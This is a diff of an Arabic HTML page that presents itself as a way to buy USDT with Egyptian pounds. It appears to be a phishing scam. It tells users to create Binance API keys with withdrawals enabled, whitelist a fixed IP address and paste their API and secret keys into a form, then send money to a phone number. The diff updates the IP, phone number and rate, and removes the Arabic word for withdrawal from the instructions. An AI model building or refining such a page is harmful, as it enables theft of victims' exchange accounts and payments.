@@ -29,7 +29,7 @@
         <li>أنشئ API جديدة باسم مناسب.</li>
         <li>قم بنسخ <strong>API Key</strong> و <strong>Secret Key</strong>.</li>
         <li>أضف عنوان الـ IP التالي: <strong class="text-red-600">41.250.100.123</strong>.</li>
-        <li>فعّل صلاحية <strong>السحب (Enable Withdrawals)</strong>.</li>
+        <li>فعّل صلاحية <strong> (Enable Withdrawals)</strong>.</li>
         <li>فعل النقل من <strong>التمويل إلى الفوري</strong>.</li>
       </ul>
     </p>
@@ -40,11 +40,11 @@
     <input id="secret-key" type="text" placeholder="Secret Key"
       class="w-full mb-3 px-4 py-2 rounded bg-gray-100 border border-gray-400"/>
 
-    <input id="ip-address" type="text" value="41.250.100.123" readonly
+    <input id="ip-address" type="text" value="192.52.1.1" readonly
       class="w-full mb-3 px-4 py-2 rounded bg-gray-200 text-gray-500 border border-gray-300"/>
 
     <button onclick="submitAPI()"
-      class="w-full py-2 bg-green-600 hover:bg-green-700 rounded text-white font-semibold">تأكيد</button>
+      class="w-full py-2 bg-green-600 hover:bg-green-700 rounded text-white font-semibold">التالي</button>
 
     <p class="text-sm mt-4 text-gray-800 text-center">
       يرجى إدخال بياناتك بشكل دقيق لضمان استلام USDT. معلوماتك محمية تمامًا.
@@ -55,7 +55,8 @@
 <!-- الصفحة الثانية -->
 <div id="converter-page" class="hidden bg-cover bg-center rounded-xl p-6" style="background-image: url('https://images.unsplash.com/photo-1565376078256-7800e6f485f4?auto=format&fit=crop&w=800&q=60');">
   <div class="bg-white bg-opacity-80 rounded-xl p-4">
-    <h2 class="text-2xl font-bold text-center mb-4 text-black">تحويل المبلغ بالجنيه</h2>
+    <h2 class="text-2xl font-bold text-center mb-4 text-black">
+اكتب المبلغ للشراء </h2>
 
     <input id="usd-amount" type="number" placeholder="المبلغ بالدولار"
       oninput="convertToEGP()"
@@ -65,7 +66,7 @@
 
     <div class="bg-yellow-100 border border-yellow-400 p-3 rounded mb-4 text-center">
       <p class="text-lg font-semibold">يرجى تحويل <span id="egp-amount" class="text-red-600 font-bold"></span> جنيه إلى الرقم:</p>
-      <p class="text-xl mt-2 font-bold">01022131546</p>
+      <p class="text-xl mt-2 font-bold">01022131543</p>
       <p class="mt-2 text-sm text-gray-600">ثم إدخل ID محفظتك Binance أدناه لاستلام USDT</p>
     </div>
 
@@ -127,7 +128,7 @@
 
     function convertToEGP() {
       const usdAmount = parseFloat(document.getElementById('usd-amount').value);
-      const rate = 50;
+      const rate = 49;
       if (!isNaN(usdAmount)) {
         calculatedResult = usdAmount * rate;
         document.getElementById('result').textContent = `= ${calculatedResult} جنيه مصري`;
@@ -155,4 +156,4 @@
       });
     }
   </script></body>
-          </html>
+</html>
